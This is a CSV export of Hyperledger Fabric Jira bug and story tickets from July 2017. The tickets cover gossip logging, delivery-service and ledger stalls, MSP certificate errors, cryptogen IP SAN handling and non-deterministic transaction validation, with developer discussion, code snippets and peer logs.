Fix formatting of channel in gossip String(),FAB-5331,19285,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,16/Jul/17 10:23 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Jul/17 5:18 PM,v1.0.0,,,v1.0.1,,fabric-gossip,,,,,,0,active,gossip,,,,,"Historically, gossip keeps the channel name in messages *[]byte* instead of in *string*s.

There is a String() method that formats complex messages and it does:
{code:java}
desc := fmt.Sprintf(""Channel: %v, nonce: %d, tag: %s"", m.Channel, m.Nonce, GossipMessage_Tag_name[int32(m.Tag)]){code}
since the channel is a byte array, the channel is printed to the log as bytes: *[121 97 99 111 118]*

It would be beneficial to print instead a string, for usability of log parsing.",,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8m7:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jul/17 5:17 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11673/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make delivery service stop pulling blocks if ledger is stuck,FAB-5332,19286,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,16/Jul/17 10:26 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Nov/17 11:18 PM,v1.0.0,,,Abandoned,,fabric-peer,,,,,,0,,,,,,,"In some cases, the delivery service pulls blocks while the ledger may be stuck, i.e if the file system is full.

 

There is no point in doing so, and we need to:
 * Make the delivery service stop pulling blocks
 * Perhaps also disable the leader election module for that channel until the peer's ledger recovers.

 

[~C0rWin] [~gennadyl]  opinions?","Closing the tickets since:

1. If there is an error on FS level, the commit will fail eventually leading peer to panic and exit.

2. It's very unlikely to get into situation where write will hangs on indefinitely, hence per discussion with @yacovm we should not try to over complicate code providing solution for this case.",C0rWin,jeffgarratt,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8mf:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,jeffgarratt,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/17 3:38 AM;muralisr;[~yacovm] can you add a comment what context this came out of (I vaguely remember there was a different context that instigated this JIRA) ?;;;","08/Sep/17 4:33 AM;yacovm;Basically HSBN had a problem where the writes were failing and the deliver service was simply pulling more and more blocks indefinitely. 
That's what I remember, [~C0rWin] can correct me if I'm wrong.

After [this|https://gerrit.hyperledger.org/r/#/c/12495/] fix went in, however- the operation would block starting from a certain block gap between the ledger and the deliver service.
so.. in a way, the first bullet is fulfilled.
The second bullet - no so much. 

We need to think more about how and whether to do this.
[~C0rWin] opinions? What shall be done with this JIRA?;;;","27/Oct/17 4:23 AM;jeffgarratt;[~yacovm] [~C0rWin] Any updates to this one?;;;","01/Nov/17 5:59 AM;C0rWin;Currently if ledger got stuck, for example due to the fact that file system is full, the commit of the block will fail and peer will result with panic. While, I understand the intent behind this ticket and even if we do delivery service and leader election to stop, the only way to resume will be to restart the peer, which for such situation seems reasonable. 

If we going on adding functionality to stop delivery service and leader election, we need to think how we would alert or let operator to know that peer has to be resumed. 

As a first step I'd suggest adding exponential backoff strategy to retry committing new blocks in case of failure.;;;","01/Nov/17 7:39 AM;yacovm;Here is an idea: 

As well known, the state module has a goroutine which repeatedly does something that can be roughly described as :
{code}
case <-s.payloads.Ready()    // wait until the next block in order is available
          s.payloads.Pop()   // pop that block
          commit block
{code}


The payload buffer (s.payloads) is fed blocks by the goroutine of the deliver service via addPayload in blocking mode, and the relevant part of the code is:
{code}
	for blockingMode && s.payloads.Size() > defMaxBlockDistance*2 {
		time.Sleep(enqueueRetryInterval)
	}

return s.payloads.Push(payload)
{code}

As we know, if the payload buffer is ""too full"", the goroutine that calls addPayload in blocking mode - spins in the for loop above doing sleep until the size of the payload buffer is reduced enough.
So, essentially we  have a struct (the one in state.go) that 2 goroutines have access to it concurrently:
* The goroutine which commits the blocks into the ledger
* The goroutine which passes the blocks to the 1st goroutine via the payload buffer, and if the file system is full - it will be either:
** stuck in receiving a block from the payload buffer
** stuck doing an endless sleep waiting for the payload buffer to get smaller in size.

I think that for v1.1 what we can do is:
* Have an atomic variable that is:
** Set to the current time right before commitBlock() is called
** Set to 0 right after commitBlock() is called
* Have the code in addPayload check in the for loop that sleeps, whether the difference between the current time and the last time commitBlock() was called isn't too high.
If it is - it means that commitBlock() takes too much time and it is stuck, so return a special error that the blocks provider (in the deliver service) would check and if it would indicate the ledger is stuck, then we ""return"" (this is the code path that triggers the leader election to give up on leadership)


What do you think [~C0rWin] ? 
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Inconsistent results between in real Fabric chaincode deployment and in unit test,FAB-5333,19288,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,mochechan,mochechan,17/Jul/17 10:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 1:09 PM,,,,,,fabric-build,,,,,,0,,,,,,,"If we use stub.PutState and stub.GetState in the same Invoke, we will get inconsistent results between in real Fabric chaincode and in unit test. Here gives a simple example:

76 func (t *CC) Invoke(stub shim.ChaincodeStubInterface) peer.Response \{
 77 var err error
 78 var byteArray []byte
 79 
 80 err = stub.PutState(""just-existing"", []byte(""just-data""))
 81 if err != nil \{
 82 return shim.Error(err.Error())
 83 }
 84 
 85 byteArray,err = stub.GetState(""just-existing"")
 86 if err != nil \{
 87 return shim.Error(err.Error())
 88 }
 89 if byteArray == nil \{
 90 fmt.Println(""success but no data "")
 91 }
 92 fmt.Println(string(byteArray))
 93 }

If we run this Invoke only one time in unit test, we will get ""just-data"".

if we run this Invoke only one time in real Fabric deployment, we will get ""success but no data"".

 ",,denyeart,mochechan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5832,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8mn:",,,,,,,,,,,,,,,,,,,,,,,denyeart,mochechan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Nov/17 1:09 PM;denyeart;Dup of FAB-5832, closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move NewChannelConfig to system channel msgprocessor,FAB-5335,19290,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Jul/17 1:56 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Aug/17 12:24 AM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,The only remaining piece of message processing left within the multichannel package is the creation of the new channel template configuration.  This fits more naturally in the msgprocessor package.,,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8mv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jul/17 5:31 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11679/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add CA server to BYFN sample,FAB-5336,19292,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,17/Jul/17 10:09 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,06/Dec/17 7:53 PM,v1.0.0,,,,,fabric-samples,,,,,,0,,,,,,,https://chat.hyperledger.org/channel/fabric-documentation?msg=qpfS2pdeK7zc88QoA,,ChristopherFerris,sujeeban,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8n3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,sujeeban,yeyc.linuxf,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jul/17 11:59 PM;sujeeban;Should starting the CA server be an option of the byfn script ? Or should we just add CA server to the BYFN sample ?;;;","06/Dec/17 7:54 PM;ChristopherFerris;We have added a fabric-ca sample that achieves the objective here.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add nil check to String() method in gossip/extensions,FAB-5339,19295,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,17/Jul/17 11:00 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 7:01 PM,v1.0.0,,,v1.0.1,,fabric-gossip,,,,,,0,,,,,,,"There is a case in the code where it is done:
{code:java}
    if m.GossipMessage != nil {
        ...
        } else if m.IsDataMsg() {
            gMsg = m.GetDataMsg().Payload.toString()
         ...
    }{code}
If somehow *m.GetDataMsg().Payload* is nil, this would result in a null pointer panic.",,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8nj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 7:01 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11681;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message max size reconfiguration only respected on restart,FAB-5340,19298,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Jul/17 11:35 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 4:41 AM,,,,v1.0.1,,fabric-orderer,,,,,,0,,,,,,,"The max message size parameters are only read when the the size filter is constructed, not at each invocation.  This means that if the batch size is reconfigured, the filter will only pick this up on restart.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8nr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Jul/17 11:48 PM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/11683/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Solo does not respect updated batch timeout,FAB-5341,19299,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,17/Jul/17 11:49 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jul/17 4:41 AM,,,,v1.0.1,,fabric-orderer,,,,,,0,,,,,,,"Solo is currently initialized with a batch timeout value, and even when it is modified by a config update, will retain the old batch timeout until restart.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8nz:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 12:24 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/11685/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
correct spelling mistake for a debug log for dropped gossip msg,FAB-5342,19300,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,scottz,scottz,scottz,18/Jul/17 12:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jul/17 7:36 PM,v1.0.0,,,v1.0.1,,fabric-gossip,,,,,,0,gossip_component,,,,,,"-FAB-5293- introduced a debug log with an incorrect word ""overflown"", which we should correct.

[https://gerrit.hyperledger.org/r/#/c/11689/] ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5293,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8o7:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Kafka.Brokers value in configtx.yaml,FAB-5345,19303,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,kchristidis,kchristidis,kchristidis,18/Jul/17 1:13 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,19/Jul/17 6:21 AM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,,,,,,"Based on user feedback, we need to:
 # Make it more obvious that this value needs to be updated
 # Show in practice how a list is populated with the YAML syntax",,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy8ov:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 1:21 AM;kchristidis;https://gerrit.hyperledger.org/r/#/c/11693/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Admin certificate is generated as a CA certificate,FAB-5348,19307,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jtrayfield,jtrayfield,18/Jul/17 4:07 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Sep/17 10:34 PM,,,,v1.0.2,,fabric-crypto,,,,,,0,,,,,,,"I get this error from the CLI:

 

Channel name : OATS

Creating channel...

CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/oats.ibm.com/peers/peer0.oats.ibm.com/tls/ca.crt

CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/oats.ibm.com/peers/peer0.oats.ibm.com/tls/server.key

CORE_PEER_LOCALMSPID=OATSMSP

CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock

CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/oats.ibm.com/peers/peer0.oats.ibm.com/tls/server.crt

CORE_PEER_TLS_ENABLED=true

CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/oats.ibm.com/users/Admin@oats.ibm.com/msp

CORE_PEER_ID=cli

CORE_LOGGING_LEVEL=DEBUG

CORE_PEER_ADDRESS=peer0.oats.ibm.com:7051

{color:#ff0000}2017-07-17 18:56:27.429 UTC [main] main -> ERRO 001 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/oats.ibm.com/users/Admin@oats.ibm.com/msp: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP{color}

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!

========= ERROR !!! FAILED to execute End-2-End Scenario ===========

 

I think the root cause is that the Admin cert is a CA cert:

$ openssl x509 -text -noout -in crypto-config/peerOrganizations/oats.ibm.com/users/Admin\@oats.ibm.com/msp/admincerts/ca.oats.ibm.com-cert.pem 

Certificate:

    Data:

        Version: 3 (0x2)

        Serial Number:

            31:58:e0:0f:93:51:92:ab:0c:5b:36:77:ac:3c:38:ce

    Signature Algorithm: ecdsa-with-SHA256

        Issuer: C=US, ST=California, L=San Francisco, O=oats.ibm.com, CN=ca.oats.ibm.com

        Validity

            Not Before: Jul 17 18:26:27 2017 GMT

            Not After : Jul 15 18:26:27 2027 GMT

        Subject: C=US, ST=California, L=San Francisco, O=oats.ibm.com, CN=ca.oats.ibm.com

        Subject Public Key Info:

            Public Key Algorithm: id-ecPublicKey

                Public-Key: (256 bit)

                pub: 

                    04:1b:48:47:3d:1c:9b:9c:dc:0f:9e:22:5e:cc:4c:

                    76:d0:cc:27:23:ea:72:22:74:57:de:7c:84:69:73:

                    51:4e:61:bd:d3:34:75:72:a1:8c:89:f0:5e:78:c7:

                    5f:0d:34:8c:ba:d9:36:42:37:39:1b:35:78:d7:a3:

                    b2:7d:1d:ae:ce

                ASN1 OID: prime256v1

                NIST CURVE: P-256

        X509v3 extensions:

            X509v3 Key Usage: critical

                Digital Signature, Key Encipherment, Certificate Sign, CRL Sign

            X509v3 Extended Key Usage: 

                Any Extended Key Usage, TLS Web Server Authentication

            X509v3 Basic Constraints: critical

                CA:TRUE

 

When I replace the admin cert with the admin MSP signcert, I don't get the error anymore.

 

 ",,chljapan,jtrayfield,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8pj:",,,,,,,,,,,,,,,,,,,,,,,chljapan,jtrayfield,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/17 11:53 PM;jtrayfield;I get this with the vanilla fabric-samples/first-network:



2017-07-19 14:51:24.817 UTC [main] main -> ERRO 001 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!

 ;;;","23/Aug/17 12:22 PM;chljapan;Can you give me a detailed plan?  by step! Thanks！！！！;;;","04/Sep/17 10:33 PM;mastersingh24;This is not the case with the current versions of the artifacts generated by the cryptogen tool.
Please move to v1.0.2  - http://hyperledger-fabric.readthedocs.io/en/latest/samples.html#download-platform-specific-binaries - and re-open if there are any issues;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MSP Identity Identifier should be computed after certificate sanitisation,FAB-5350,19310,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,angelo.decaro,angelo.decaro,18/Jul/17 10:16 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 4:57 PM,v1.0.0,,,v1.1.0,,fabric-crypto,,,,,,0,help-wanted,MembershipServices,Security,,,,"The MSP Identity Identifier consists of the MSP id and the Hash of the identity's certificate. 
Currently, it is computed before the certificate sanitisation. So, an attacker can still hope to present itself with two valid identities to the network.

So far, Fabric does not use the Identity Identifier to reason about access control so the above does not constitute an issue. It anyway needs to be fixed in order to allow to reason about Identity Identifiers in a safe way, 

This change is required to be able to add caching mechanisms to MSP to improve performances.

[~ellaki], [~ales], please, have your say :)
",,angelo.decaro,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2h3:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Aug/17 4:58 PM;elli-androulaki;[https://gerrit.hyperledger.org/r/#/c/11929/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Not able to setup a fabric network using IP addresses,FAB-5352,19316,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tonyyang132,tonyyang132,tonyyang132,18/Jul/17 7:10 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Aug/17 6:29 PM,v1.0.0,,,v1.1.0,,fabric-tools,,,,,,0,,,,,,,"I've been trying to setup a hyperledger fabric network following the e2e_cli example. What I needed to do differently than the default setup was that I configured the all orderers and peers with IP addresses, including in configtx.yaml, base/docker-compose-base.yaml and scripts/script.sh. When it tried to create a channel in script.sh, the following error occurred:

 
{code:java}
 ____    _____      _      ____    _____           _____   ____    _____
/ ___|  |_   _|    / \    |  _ \  |_   _|         | ____| |___ \  | ____|
\___ \    | |     / _ \   | |_) |   | |    _____  |  _|     __) | |  _|
 ___) |   | |    / ___ \  |  _ <    | |   |_____| | |___   / __/  | |___
|____/    |_|   /_/   \_\ |_| \_\   |_|           |_____| |_____| |_____|

Channel name : mychannel
Creating channel...
CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key
CORE_PEER_LOCALMSPID=Org1MSP
CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock
CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt
CORE_PEER_TLS_ENABLED=true
CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
CORE_PEER_ID=cli
CORE_LOGGING_LEVEL=DEBUG
CORE_PEER_ADDRESS=172.16.10.31:7051
2017-07-18 09:13:29.326 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP
2017-07-18 09:13:29.326 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity
2017-07-18 09:13:29.331 UTC [grpc] Printf -> DEBU 003 Failed to dial 172.16.10.31:7050: connection error: desc = ""transport: authentication handshake failed: x509: cannot validate certificate for 172.16.10.31 because it doesn't contain an
y IP SANs""; please retry.
Error: Error connecting due to  rpc error: code = Internal desc = connection error: desc = ""transport: authentication handshake failed: x509: cannot validate certificate for 172.16.10.31 because it doesn't contain any IP SANs""
Usage:
  peer channel create [flags]

Flags:
  -c, --channelID string   In case of a newChain command, the channel ID to create.
  -f, --file string        Configuration transaction file generated by a tool such as configtxgen for submitting to orderer
  -t, --timeout int        Channel creation timeout (default 5)

Global Flags:
      --cafile string              Path to file containing PEM-encoded trusted certificate(s) for the ordering endpoint
      --logging-level string       Default logging level and overrides, see core.yaml for full syntax
  -o, --orderer string             Ordering service endpoint
      --test.coverprofile string   Done (default ""coverage.cov"")
      --tls                        Use TLS when communicating with the orderer endpoint
  -v, --version                    Display current version of fabric peer server

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!
================== ERROR !!! FAILED to execute End-2-End Scenario ==================
{code}
I then tried setting relevant IP addresses as SANS in crypto-config.yaml, but the error was still the same.",,tonyyang132,ysim,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4364,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy8pz:",,,,,,,,,,,,,,,,,,,,,,,tonyyang132,ysim,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 7:22 PM;tonyyang132;I digged a bit further and found the issue in https://github.com/hyperledger/fabric/blob/master/common/tools/cryptogen/ca/generator.go#L103. No matter what is provided as SANS in crypto-config.yaml, current logic assumes they are host names and put them in template.DNSNames. I believe a more reasonable approach would be to examine the content of SANS and if it's an IP address, put it in template.IPAddresses.;;;","18/Jul/17 8:01 PM;tonyyang132;A possible fix - https://gerrit.hyperledger.org/r/11719;;;","19/Jul/17 5:46 PM;tonyyang132;Should have done a better job searching for existing work items before raising this one. It turns out that there has already been a mention of the issue - https://jira.hyperledger.org/browse/FAB-4364.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Block validation logic is not deterministic with respect to error handling,FAB-5353,19317,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,C0rWin,denyeart,denyeart,18/Jul/17 7:13 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Jul/17 8:40 PM,v1.0.0,,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"If an unexpected error occurs during block validation for a certain transaction, the transaction will get marked as invalid and processing will continue, the block will get committed with the tran marked invalid.  Other peers that do not hit the unexpected error will pass validation and the block will get committed with the tran marked valid. Valid trans will cause state db to get updated. Invalid trans will not update state db.

txvalidator needs to carefully distinguish between unexpected errors and invalidations, to ensure deterministic behavior across peers.  Unexpected errors should result in a peer panic so that an administrator can identify the problem.

One specific example of the problem has been found, although there may be others.  In the specific example, if the state database is unavailable (e.g. couchdb container stopped), then VSCCValidateTx() returns an error and the Validate function simply marks the tran as invalid and continues.  VSCCValidateTx() should distinguish between normal invalidations and unexpected errors, and then the Validate function should panic if an unexpected error is hit.

Here is the peer log entry for this scenario:

{code}
2017-07-18 08:44:49.964 UTC [txvalidator] GetInfoForValidate -> ERRO 5f6 Unable to get chaincode data from ledger for txid 6b975cc80cf0605188460b6e9b9a15b6d102e5d9c5b25fbcda3538b335cf7963, due to Could not retrieve state for chaincode marbles, error Get [http://127.0.0.1:5984/myc/lscc%00marbles?attachments=true:] dial tcp 127.0.0.1:5984: getsockopt: connection refused
 2017-07-18 08:44:49.964 UTC [txvalidator] VSCCValidateTx -> ERRO 5f7 GetInfoForValidate for txId = 6b975cc80cf0605188460b6e9b9a15b6d102e5d9c5b25fbcda3538b335cf7963 returned error Could not retrieve state for chaincode marbles, error Get [http://127.0.0.1:5984/myc/lscc%00marbles?attachments=true:] dial tcp 127.0.0.1:5984: getsockopt: connection refused
 2017-07-18 08:44:49.964 UTC [txvalidator] Validate -> ERRO 5f8 VSCCValidateTx for transaction txId = 6b975cc80cf0605188460b6e9b9a15b6d102e5d9c5b25fbcda3538b335cf7963 returned error Could not retrieve state for chaincode marbles, error Get [http://127.0.0.1:5984/myc/lscc%00marbles?attachments=true:] dial tcp 127.0.0.1:5984: getsockopt: connection refused
{code}

